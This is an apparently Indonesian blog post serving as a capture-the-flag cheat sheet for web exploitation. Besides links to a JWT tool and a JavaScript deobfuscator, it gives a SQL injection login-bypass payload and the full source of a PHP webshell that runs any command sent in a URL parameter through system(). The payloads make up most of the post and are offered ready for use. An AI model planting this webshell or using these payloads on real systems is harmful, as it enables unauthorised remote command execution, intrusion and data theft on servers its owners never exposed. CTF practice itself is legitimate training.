---
title: Semua Tentang CTF - Kategori Web Exploitation
published: true
---
## Tools
Kategori Web Exploitation:
1. JWT (JSON Web Token) - https://token.dev/
2. Deobfuscate Kode JS - https://deobfuscate.io/

## Kode
SQL Injection
```sql
' OR 1=1 OR '1'='1
```

PHP Webshell (Execute Linux Command) dari [joswr1ght](gist.github.com/joswr1ght).

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
